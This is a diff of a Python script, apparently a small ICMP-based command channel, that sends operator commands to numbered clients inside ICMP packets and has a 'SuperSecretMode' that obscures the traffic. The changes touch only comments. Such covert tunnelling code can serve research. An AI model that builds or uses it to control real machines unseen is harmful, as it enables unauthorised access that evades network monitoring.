@@ -3,8 +3,7 @@ from scapy.all import ICMP,IP
 import json
 import threading
 
-# ERRORS WITH ENCRYPTED MODE 
-# DONT JUDGE MY CODE DONT EVEN WORRY ABOUT IT
+# STILL IN PRODUCTION
 
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = False               # Set to display statements specific to debugging issues
@@ -75,11 +74,14 @@ def send_command(arguments, clients, execute):
         clienttokens = clientcommand.split(" ", 1)
         if clients.get(int(clienttokens[0])) != None:
             if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))
+
+            # FOR FUTURE PACKET SEGMENTATION
             # if len(clienttokens[1].encode('utf-8')) > 1469:
             #     piece = clienttokens[1][:1469]
             #     segment = "!!!" + piece 
             #  segments = len(clienttokens[1].encode('utf-8'))//1469
             # if DEVDEBUG: print(segments)
+
             send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1], execute)
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
             if DEBUG and not SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
@@ -88,6 +90,7 @@ def send_command(arguments, clients, execute):
     except:
         print("[ERROR] Usage: send <ID> <message>")
 
+# "Encryption" for SuperSecretMode
 def encrypt_decrypt(plaintext):
     encrypted = ""
     for i in range(len(plaintext)):
